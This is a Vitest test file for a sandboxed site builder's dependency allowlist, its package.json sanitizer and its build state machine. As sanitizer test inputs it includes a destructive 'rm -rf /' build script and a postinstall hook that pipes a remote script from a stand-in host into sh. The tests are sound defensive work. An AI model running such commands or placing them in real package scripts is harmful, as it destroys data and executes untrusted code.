import { describe, expect, it } from 'vitest';
import {
  ALLOWED_DEPENDENCIES,
  assertDependenciesAllowed,
  sanitizePackageJson,
} from '../sandbox/dependencies.js';
import { canTransition, BUILD_STATES } from '@wolf-forge/shared-types';

describe('dependency allowlist', () => {
  it('accepts allowed dependencies and resolves versions', () => {
    const resolved = assertDependenciesAllowed(['react', 'react-dom']);
    expect(resolved.react).toBe(ALLOWED_DEPENDENCIES.react);
    expect(resolved['react-dom']).toBe(ALLOWED_DEPENDENCIES['react-dom']);
  });

  it('rejects unknown dependencies', () => {
    expect(() => assertDependenciesAllowed(['evil-package'])).toThrow(/approved|deny|reject/i);
  });

  it('rejects denylisted package names', () => {
    expect(() => assertDependenciesAllowed(['node-pre-gyp'])).toThrow(/deny|reject/i);
  });
});

describe('sanitizePackageJson', () => {
  it('preserves a build script that chains with &&', () => {
    const out = sanitizePackageJson(
      JSON.stringify({
        name: 'my-site',
        dependencies: { react: '^18.3.1' },
        devDependencies: { vite: '^5.4.11', typescript: '^5.7.3' },
        scripts: { build: 'tsc -b && vite build' },
      }),
    );
    const parsed = JSON.parse(out);
    expect(parsed.scripts.build).toBe('tsc -b && vite build');
    expect(parsed.devDependencies.vite).toBeDefined();
  });

  it('strips scripts that background or chain with shell metacharacters', () => {
    const out = sanitizePackageJson(
      JSON.stringify({
        scripts: { build: 'tsc & rm -rf /' },
      }),
    );
    const parsed = JSON.parse(out);
    expect(parsed.scripts.build).toBeUndefined();
  });

  it('strips non-allowlisted scripts', () => {
    const out = sanitizePackageJson(
      JSON.stringify({
        scripts: {
          build: 'vite build',
          postinstall: 'curl evil.sh | sh',
        },
      }),
    );
    const parsed = JSON.parse(out);
    expect(parsed.scripts.postinstall).toBeUndefined();
    expect(parsed.scripts.build).toBe('vite build');
  });

  it('rejects packages whose name signals an install hook', () => {
    expect(() =>
      sanitizePackageJson(
        JSON.stringify({
          dependencies: { 'node-pre-gyp': '^1.0.0' },
        }),
      ),
    ).toThrow();
  });
});

describe('build state machine', () => {
  it('covers the documented build states in order', () => {
    expect(BUILD_STATES).toContain('Queued');
    expect(BUILD_STATES).toContain('PreviewReady');
    for (const s of BUILD_STATES) {
      expect(s).toEqual(s);
    }
  });

  it('allows the builtin pipeline path', () => {
    expect(canTransition('Queued', 'Analyzing')).toBe(true);
    expect(canTransition('Analyzing', 'Planning')).toBe(true);
    expect(canTransition('Planning', 'Generating')).toBe(true);
    expect(canTransition('Generating', 'Installing')).toBe(true);
    expect(canTransition('Installing', 'Building')).toBe(true);
    expect(canTransition('Building', 'Repairing')).toBe(true);
    expect(canTransition('Repairing', 'Building')).toBe(true);
    expect(canTransition('Building', 'StartingPreview')).toBe(true);
    expect(canTransition('StartingPreview', 'PreviewReady')).toBe(true);
  });

  it('rejects illegal transitions', () => {
    expect(canTransition('Queued', 'PreviewReady')).toBe(false);
    expect(canTransition('Installing', 'Analyzing')).toBe(false);
  });
});